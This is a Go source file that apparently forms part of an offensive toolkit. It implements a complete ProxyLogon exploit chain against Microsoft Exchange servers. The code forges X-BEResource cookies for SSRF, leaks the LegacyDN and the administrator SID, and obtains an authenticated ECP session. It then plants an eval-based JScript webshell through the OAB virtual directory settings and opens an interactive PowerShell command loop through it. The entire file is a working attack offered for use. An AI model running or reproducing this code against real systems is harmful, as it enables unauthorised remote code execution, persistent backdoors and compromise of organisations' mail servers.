package proxylogon

import (
	"crypto/tls"
	"fmt"
	"github.com/go-resty/resty/v2"
	"goexploit/common"
	"net/http"
	"os"
	"regexp"
	"strings"
	"time"
)

func Exploit(email string) {
	shellName := common.GetRandomString(5) + ".aspx"
	fmt.Print("Input a Email to Exploit:")
	fmt.Scanln(&email)
	randomName := common.GetRandomString(4) + ".aspx"
	shellPath := `Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\` + shellName
	shellAbsoultePath := `\\127.0.0.1\c$\` + shellPath
	shellContent := `<script language="JScript" runat="server"> function Page_Load(){eval(Request["data"],"unsafe");}</script>`
	//legecyDnPathByte := "68747470733a2f2f696d6775722e636f6d2f612f7a54646e5378670a0a0a0a0a0a0a0a"
	autoDiscoverBody := fmt.Sprintf(`<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
    <Request>
      <EMailAddress>%s</EMailAddress> <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
    </Request>
</Autodiscover>`, email)
	fmt.Println("[*] Attempting SSRF")
	FQDN := common.Args.Target
	client := resty.New().EnableTrace().SetTimeout(time.Duration(common.Args.TimeOut)*time.Second).SetTLSClientConfig(&tls.Config{InsecureSkipVerify: true}).SetProxy(common.Args.Proxy).SetHeader("User-Agent", common.Args.UA)
	client.Header.Add("Cookie", "X-BEResource=localhost~1942062522")
	resp, err := client.R().Get(common.Args.Target + "/ecp/" + randomName)
	if err != nil {
		fmt.Println("[-] exploit failed")
		return
	}
	if resp.Header().Get("X-CalculatedBETarget") != "" && resp.Header().Get("X-FEServer") != "" {
		FQDN = client.Header.Get("X-FEServer")
	}
	client.Header.Set("Cookie", fmt.Sprintf("X-BEResource=%s/autodiscover/autodiscover.xml?a=~1942062522;", FQDN))
	client.Header.Add("Content-Type", "text/xml")
	resp, err = client.R().SetBody(autoDiscoverBody).Post(common.Args.Target + "/ecp/" + randomName)
	if err != nil {
		fmt.Println("[-] exploit failed")
		return
	}
	if resp.StatusCode() != 200 || !strings.Contains(string(resp.Body()), "<LegacyDN>") {
		fmt.Println("[-] exploit Failed!")
		return
	}
	rex := regexp.MustCompilePOSIX("<LegacyDN>(.*?)</LegacyDN>")
	legacyDN := rex.FindStringSubmatch(string(resp.Body()))[1]
	mapiBody := legacyDN + "\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"
	client.Header.Add("Cookie", fmt.Sprintf("X-BEResource=Administrator@%s:444/mapi/emsmdb?MailboxId=c8c9275b-4f46-4d48-9096-f0ec2e4ac8eb@lab.local&a=~1942062522;", FQDN))
	client.Header.Add("Content-Type", "application/mapi-http")
	client.Header.Add("X-Requesttype", "Connect")
	client.Header.Add("X-Clientinfo", "{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}")
	client.Header.Add("X-Clientapplication", "Outlook/15.0.4815.1002")
	client.Header.Add("X-Requestid", "{C715155F-2BE8-44E0-BD34-2960067874C8}:2")
	resp, err = client.R().SetBody(mapiBody).Post(common.Args.Target + "/ecp/" + randomName)
	if err != nil {
		fmt.Println("[-] exploit failed")
		return
	}
	if resp.StatusCode() != 200 || !strings.Contains(string(resp.Body()), "act as owner of a UserMailbox") {
		fmt.Println("[-] Mapi Error...")
		fmt.Println("[-] Exploit Failed...")
		return
	}
	sid := regexp.MustCompilePOSIX("SID (.*?) and").FindStringSubmatch(string(resp.Body()))[1]
	result := strings.Split(sid, "-")
	if result[len(result)-1] == "500" {
		fmt.Println("SID: " + sid)
	} else {
		fmt.Println("Origin Sid: " + sid)
		result[len(result)-1] = "500"
		sid = strings.Join(result, "-")
		fmt.Println("Corrected SID: " + sid)
	}
	fmt.Println("[+] SSRF Successful!")
	fmt.Println("[+] Attempting Arbitrary File Write")
	proxyLogon_request := fmt.Sprintf(`<r at="Negotiate" ln="john"><s>%s</s><s a="7" t="1">S-1-1-0</s><s a="7" t="1">S-1-5-2</s><s a="7" t="1">S-1-5-11</s><s a="7" t="1">S-1-5-15</s><s a="3221225479" t="1">S-1-5-5-0-6948923</s></r>`, sid)
	resp, err = client.R().SetBody(proxyLogon_request).SetHeader("Cookie", fmt.Sprintf("X-BEResource=Administrator@%s:444/ecp/proxyLogon.ecp?a=~1942062522;", FQDN)).SetHeader("msExchLogonAccount", sid).SetHeader("msExchLogonMailbox", sid).SetHeader("msExchTargetMailbox", sid).SetHeader("Content-Type", "text/xml").Post(common.Args.Target + "/ecp/" + randomName)
	if err != nil {
		fmt.Println("Exploit Failed")
		return
	}
	if resp.StatusCode() != 241 || resp.Header().Get("set-cookie") == "" {
		fmt.Println("[-] Proxylogon Error!")
		return
	}
	sess_id := strings.Split(strings.Split(resp.Header().Get("set-cookie"), "ASP.NET_SessionId=")[1], ";")[0]
	msExchEcpCanary := strings.Split(strings.Split(resp.Header().Get("set-cookie"), "msExchEcpCanary=")[1], ";")[0]
	fmt.Println("SessionID: " + sess_id)
	fmt.Println("CanaryToken: " + msExchEcpCanary)
	resp, err = client.R().SetHeader("Cookie", fmt.Sprintf("X-BEResource=Admin@%s:444/ecp/about.aspx?a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s", FQDN, sess_id, msExchEcpCanary)).SetHeader("msExchLogonAccount", sid).SetHeader("msExchLogonMailbox", sid).SetHeader("msExchTargetMailbox", sid).Get(common.Args.Target + "/ecp/" + randomName)
	if err != nil {
		fmt.Println("Exploit Failed")
		return
	}
	if resp.StatusCode() != http.StatusOK {
		fmt.Println("[+] Wrong canary!")
		fmt.Println("[+] Sometime we can skip this ...")
		return
	}
	rabacRole := strings.Split(strings.Split(string(resp.Body()), "RBAC roles:</span> <span class='diagTxt'>")[1], "</span>")[0]
	fmt.Println("[+] RabacRole: " + rabacRole)
	resp, err = client.R().SetBody(`{
	"filter": {
		"Parameters": {
			"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
			"SelectedView": "",
			"SelectedVDirType": "All"
		}
	},
	"sort": {}
}`).SetHeader("Cookie", fmt.Sprintf("X-BEResource=Admin@%s:444/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s", FQDN, msExchEcpCanary, sess_id, msExchEcpCanary)).SetHeader("msExchLogonAccount", sid).SetHeader("msExchLogonMailbox", sid).SetHeader("msExchTargetMailbox", sid).SetHeader("Content-Type", "application/json; charset=utf-8").Post(common.Args.Target + "/ecp/" + randomName)
	if resp.StatusCode() != http.StatusOK {
		fmt.Println("[-] GetOAB Error!")
		return
	}
	oabId := strings.Split(strings.Split(string(resp.Body()), `"RawIdentity":"`)[1], "\"")[0]
	fmt.Println("OABId: " + oabId)
	oabJson := fmt.Sprintf(`{"identity": {"__type": "Identity:ECP", "DisplayName": "OAB (Default Web Site)", "RawIdentity": %s},
            "properties": {
                "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                               "ExternalUrl": "https://ffff/#%s"}}}`, oabId, shellContent)
	resp, err = client.R().SetBody(oabJson).SetHeader("Cookie", fmt.Sprintf("X-BEResource=Admin@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s", FQDN, msExchEcpCanary, sess_id, msExchEcpCanary)).SetHeader("msExchLogonAccount", sid).SetHeader("msExchLogonMailbox", sid).SetHeader("msExchTargetMailbox", sid).SetHeader("Content-Type", "application/json; charset=utf-8").Post(common.Args.Target + "/ecp/" + randomName)
	if err != nil {
		fmt.Println("Exploit Failed")
		return
	}
	if resp.StatusCode() != http.StatusOK {
		fmt.Println("[-] Set external url Error!")
		return
	}
	resetOabBody := fmt.Sprintf(`{"identity": {"__type": "Identity:ECP", "DisplayName": "OAB (Default Web Site)", "RawIdentity": %s},
                  "properties": {
                      "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                                     "FilePathName": %s}}}`, oabId, shellAbsoultePath)
	resp, err = client.R().SetBody(resetOabBody).SetHeader("Cookie", fmt.Sprintf("X-BEResource=Admin@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s", FQDN, msExchEcpCanary, sess_id, msExchEcpCanary)).SetHeader("msExchLogonAccount", sid).SetHeader("msExchLogonMailbox", sid).SetHeader("msExchTargetMailbox", sid).SetHeader("Content-Type", "application/json; charset=utf-8").Post(common.Args.Target + "/ecp/" + randomName)
	if resp.StatusCode() != http.StatusOK {
		fmt.Printf("[-] Error writing the shell. Status code returned %d", resp.StatusCode())
		return
	}
	if !common.Args.Multi {
		fmt.Println("[+] Success! Entering webshell. Type 'quit' or 'exit' to escape.")
		shell(client, common.Args.Target, FQDN, shellName)
	}
}
func shell(client *resty.Client, Target string, Host string, shellName string) {
	var command string
	for {
		fmt.Print("# ")
		fmt.Scanf("%s\n", &command)
		data := fmt.Sprintf(`data=Response.Write(new ActiveXObject("WScript.Shell").exec("powershell.exe -command  %s").stdout.readall());`, command)
		switch command {
		case "exit", "quit":
			os.Exit(0)
		default:
			resp, err := client.R().SetBody(data).SetHeader("Content-Type", "application/x-www-form-urlencoded").SetHeader("Host", Host).SetHeader("Upgrade-Insecure-Requests", "1").Post(Target + "/owa/auth/" + shellName)
			if err != nil {
				fmt.Println("Command Run Failed")
				continue
			}
			if resp.StatusCode() != http.StatusOK {
				fmt.Printf("[-] Error running command. Status code %d", resp.StatusCode())
				continue
			}
			if resp.StatusCode() == http.StatusInternalServerError {
				fmt.Println("[-] Maybe AV is killing it?")
				continue
			}
			fmt.Println(strings.Split(string(resp.Body()), "Name                            :")[0])
		}
	}
}
